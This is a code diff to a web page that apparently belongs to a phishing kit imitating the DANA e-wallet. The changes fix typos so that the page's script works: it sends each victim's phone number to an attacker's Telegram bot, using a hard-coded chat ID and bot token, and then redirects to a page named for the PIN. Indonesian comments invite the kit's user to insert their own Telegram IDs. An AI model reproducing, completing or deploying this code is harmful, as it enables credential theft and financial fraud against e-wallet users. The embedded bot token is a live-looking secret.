@@ -218,9 +218,9 @@
     inputTlp.value = '';
     }
     });
-  </script>
+  </script> 
   <script>
-    function submitform() {
+function submitform() {
     inputTlp.readOnly = true;
     let xx = document.getElementById("process");
     xx.style.display = 'flex';
@@ -229,23 +229,26 @@
     sessionStorage.setItem("phoneNumber", phoneenumber);
     let phone_number = phoneenumber.replace(/-/g, '');
     let message = `
-    DANA | NoHP | ${phone_number}
+DANA | NoHP | ${phone_number}
 
-    - No HP : ${phone_number}`;
+- No HP : ${phone_number}`;
 
-    //_masukan_ID_Akun_Telegram_kamu
-    var id_telegram = "6751845484";
-    //_masukan_ID_Bot_Telegram_kamu
-    var token_botTele = "7428702458:AAFZoC825g_0o-P28EgKdNQSyn6OV_-H1tQ";
-    fetch("https://api.telegram.org/bot"+token_botTelegram+"/sendMessage?rse_mode=markdown", {
-    method: 'POST',
-    headers: {
-    'Accept': 'applation/json',
-    'Content-Type': 'application/json'
-    }, body: JSON.stringy({
-    chat_id: id_telegram,
-    text: message
-    })
+//_masukan_ID_Akun_Telegram_kamu
+var id_telegram   = "6751845484";
+//_masukan_ID_Bot_Telegram_kamu
+var token_botTele = "7428702458:AAFZoC825g_0o-P28EgKdNQSyn6OV_-H1tQ";
+    fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },body: JSON.stringify({
+            chat_id: id_telegram,
+            text: message
+        })
     });
-   tion.href = "./dana_pin.html";
- 
+    window.location.href = "./dana_pin.html";
+}
+</script>
+ </body>
+</html>
